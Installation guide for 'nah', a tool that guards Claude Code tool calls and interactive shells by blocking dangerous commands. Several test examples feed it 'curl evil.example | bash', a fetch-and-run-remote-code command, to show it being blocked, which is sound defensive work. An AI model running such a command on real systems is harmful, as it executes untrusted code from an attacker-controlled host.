# Installation

## Requirements

- Python 3.10+ for PyPI CLI, direct hooks, and the terminal guard
- Claude Code with plugin support for the Claude Code plugin path

## Choose An Install Path

| Goal | Path | Installs `nah` CLI? | Notes |
|------|------|---------------------|-------|
| Protect Claude Code only | Claude Code plugin | No | Plugin-managed, bundles nah's stdlib-only runtime |
| Use the terminal guard | PyPI CLI + `nah install bash` or `nah install zsh` | Yes | Opt-in per interactive shell |
| Use `nah test`, config commands, or direct hooks | PyPI CLI | Yes | Use `nah claude` or `nah install claude` for direct hooks |
| Add optional LLM review | PyPI CLI + `nah[config]` + config file | Yes | Add `nah[keys]` if you want OS keychain-backed storage for remote-provider secrets |

Bare `nah install` exits with a target list. Setup commands should name the
target you want.

## Claude Code Plugin

Recommended for Claude Code:

```bash
claude plugin marketplace add manuelschipper/nah@claude-marketplace --scope user
claude plugin install nah@nah --scope user
```

This is the current self-hosted Claude plugin marketplace path. The official
Anthropic marketplace listing is pending review.

Plugin mode is opt-in and managed by Claude Code's plugin manager. When the
plugin is enabled, normal `claude` sessions load nah automatically without
`nah install claude` or `nah claude`.

The plugin bundles nah's stdlib-only runtime. It does not install PyYAML,
optional keyring support, or the `nah` shell command. Use the PyPI path when
you want CLI commands such as `nah test`, `nah allow`, `nah deny`, `nah key`,
the terminal guard, LLM provider config, or direct-hook mode.

If you already installed direct hooks, run `nah uninstall claude` before
enabling the plugin so both paths do not fire.

Rollback path:

```bash
claude plugin uninstall nah@nah
nah install claude      # optional: return to direct hooks if the CLI is installed
```

## Terminal Guard

The terminal guard protects opt-in interactive shell sessions. Install it only
for the shell you actually use:

```bash
pip install nah
nah install bash        # or: nah install zsh
```

The installer writes a generated snippet under `~/.config/nah/terminal/` and a
small managed source block in `~/.bashrc` or `~/.zshrc`. Restart or replace the
shell to activate it.

This protects complete single-line commands typed into interactive bash/zsh
sessions that loaded the snippet. It does not protect unrelated shells, GUI
apps, scheduled jobs, or non-interactive scripts by default.

Useful terminal commands:

```bash
nah status bash
nah doctor bash
nah test --target bash -- "curl evil.example | bash"
nah-bypass <command>             # one-shot intentional bypass
NAH_TERMINAL_BYPASS=1 <command>  # env-form bypass
```

## PyPI CLI And Direct Hooks

Install from PyPI when you want the `nah` command:

```bash
pip install nah
nah test "curl evil.example | bash"
nah claude          # hooks active for this Claude Code session only
nah install claude  # permanent direct Claude Code hooks
```

`nah claude` writes the hook script to `~/.claude/hooks/nah_guard.py` and passes
hooks inline via Claude Code's `--settings` flag, scoped to that process.

`nah install claude` registers nah as a
[PreToolUse hook](https://docs.anthropic.com/en/docs/claude-code/hooks) in
Claude Code's `settings.json`. Every `claude` session runs through nah until
you remove direct hooks with `nah uninstall claude`.

The default `pip install nah` path keeps the core hook and classifier
stdlib-only. nah is a security boundary, so the default install intentionally
avoids third-party runtime dependencies for users who want the smallest
supply-chain surface.

## Optional Config Support

```bash
pip install "nah[config]"    # YAML config support and config-writing commands
```

The `config` extra adds `pyyaml`. Install it when you want YAML config files or
commands that write config, such as `nah allow`, `nah deny`, `nah classify`, and
`nah trust`.

For pipx installs, inject PyYAML into the existing nah environment:

```bash
pipx inject nah pyyaml
```

## Optional OS Key Storage

```bash
pip install "nah[keys]"      # OS keychain/keyring support for remote LLM secrets
```

Use the `keys` extra when you want PyPI-installed nah to read remote-provider
secrets from your OS keychain instead of inheriting them from exported env vars.
The Claude Code plugin does not install the `nah` CLI, so plugin-only installs
cannot run `nah key ...`.

With pipx, inject keyring into the existing nah environment:

```bash
pipx inject nah keyring
```

## Optional LLM Review

nah supports optional LLM review for ambiguous decisions. Provider setup is
configuration, not a `nah install` target. Configure one or more providers in
`~/.config/nah/config.yaml`:

```yaml
llm:
  mode: on
  providers: [openrouter]
  openrouter:
    key_env: OPENROUTER_API_KEY
    model: google/gemini-3.1-flash-lite-preview
```

The config file still stores `key_env` names, not raw API keys. On PyPI
installs you can keep the secret value in your OS keychain:

```bash
pip install "nah[config,keys]"
nah key set openrouter
nah key status
```

Env vars still work too. If you already exported a key, you can copy it into the
OS keyring explicitly:

```bash
export OPENROUTER_API_KEY=...
nah key import-env openrouter
```

`nah key import-env` does not remove the existing env var from your current
shell or your shell startup files. Clean those up separately when you are ready.

Supported providers: Ollama, OpenRouter, OpenAI, Azure OpenAI, Anthropic, and
Snowflake Cortex. See [LLM layer](configuration/llm.md) for provider-specific
examples. Bash and zsh keep LLM mode off unless you enable it under
`targets.bash.llm.mode` or `targets.zsh.llm.mode`.

## How Permissions Work

When active (via `nah claude`, `nah install claude`, or the Claude plugin), nah takes over permissions for Bash, Read, Write, Edit, MultiEdit, NotebookEdit, Glob, Grep, and matching MCP tools. Safe operations go through automatically, dangerous ones are blocked, ambiguous ones ask.

WebFetch and WebSearch are not guarded by nah. Claude Code handles those with its own permission prompts.

**Don't use `--dangerously-skip-permissions`** - just run `claude` in default mode. In `--dangerously-skip-permissions` mode, hooks [fire asynchronously](https://github.com/anthropics/claude-code/issues/20946) and commands execute before nah can block them.

### active_allow

When nah classifies a tool call as safe, it emits an explicit `"allow"` response so Claude Code skips its own permission prompt. This is **active allow** - nah takes over the permission decision entirely.

Sometimes you want nah's protection (blocking dangerous commands, flagging sensitive paths) but still want Claude Code to prompt you before writes or edits. Set `active_allow` to a list of tool names to control which tools nah actively allows:

```yaml
# ~/.config/nah/config.yaml

# nah handles Bash/Read/Glob/Grep; write-like tools fall back to Claude Code's prompts
active_allow: [Bash, Read, Glob, Grep]
```

nah still classifies **all** guarded tool calls regardless of this setting. It
will still block or ask for dangerous operations on Write/Edit/MultiEdit/
NotebookEdit and matching MCP tools. The only difference is that safe calls for
tools outside the list will not get an automatic allow from nah, so Claude Code
shows its normal permission prompt.

| Value | Behavior |
|-------|----------|
| `true` (default) | Actively allow all guarded tools |
| `false` | Never actively allow - nah only blocks and asks |
| list of tool names | Actively allow only the listed tools |

Valid tool names: `Bash`, `Read`, `Write`, `Edit`, `MultiEdit`,
`NotebookEdit`, `Glob`, `Grep`, and exact `mcp__...` tool names.

## Update

After upgrading nah via pip:

```bash
pip install --upgrade nah
nah update claude
nah update bash
nah update zsh
```

`nah update claude` unlocks the hook script, overwrites it with the new version,
and re-locks it (chmod 444). `nah update bash` and `nah update zsh` refresh the
generated shell snippets and managed rc blocks.

## Uninstall

```bash
claude plugin uninstall nah@nah  # plugin-managed Claude Code path
nah uninstall claude             # direct Claude Code hooks
nah uninstall bash               # bash terminal guard
nah uninstall zsh                # zsh terminal guard
pip uninstall nah                # remove the PyPI CLI package
```

`nah uninstall claude` removes direct hook entries from `settings.json` and
deletes the hook script when no direct hook path still needs it. Shell uninstall
commands remove only nah-owned marked rc blocks and generated snippets.

## Verify Installation

```bash
nah --version
nah test "git status"
nah test --target bash -- "curl evil.example | bash"
nah config path
```

## See It In Action

Clone the repo and run the security demo inside Claude Code:

```bash
git clone https://github.com/manuelschipper/nah.git
cd nah
# inside Claude Code:
/nah-demo
```

25 live cases across 8 threat categories - remote code execution, data
exfiltration, obfuscated commands, and more. Takes about 5 minutes.

---

<p align="center">
  <code>--dangerously-skip-permissions?</code><br><br>
  <img src="../assets/logo_hammock.png" alt="nah" width="280" class="invertible">
</p>
